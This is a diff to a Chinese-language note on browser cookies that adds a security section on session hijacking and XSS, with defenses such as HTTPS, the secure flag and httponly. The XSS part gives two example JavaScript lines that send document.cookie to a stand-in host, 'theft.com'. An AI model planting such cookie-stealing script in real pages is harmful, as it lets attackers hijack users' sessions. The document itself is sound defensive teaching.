@@ -42,4 +42,16 @@ document.cookie='cookieName=cookieValue; expires=Tue, 06 Apr 2021 11:46:35 GMT; 
 `3. 删除cookie时，domain和path需要一致`<br>
 `4. httponly只能通过服务端Set-Cookie设置`<br>
 ## Cookie安全
-#### 会话劫持
+#### session hijacking（会话劫持）
+在客户端和服务端之间进行cookie的传输时，网络上的流量可以被发送方以外的网络上的计算机拦截和读取，特别是在未加密开放式的wifi上，通过拦截到的cookie来冒充用户发起恶意行为<br>
+
+1.可以使用https加密传输，同时设置secure只能通过https进行传输<br>
+2.随机方式生成会话，或者基于用户信息+时间+ip地址生成会话
+#### XSS（跨站脚本攻击）
+在客户端执行了没有经过过滤的恶意代码将cookie发送到第三方服务器上，即使cookie添加了secure，如果第三方服务器启用了https，一样会被发送,如下代码
+```js
+ (new image()).src='https://theft.com/transparent.jpg?cookie='+document.cookie;
+ <a href="#" onclick="window.location = 'http://theft.com/stole?cookie=' + encodeURIComponent(document.cookie); return false;">点击</a>
+```
+
+1.由服务端通过Set-Cookie设置httponly
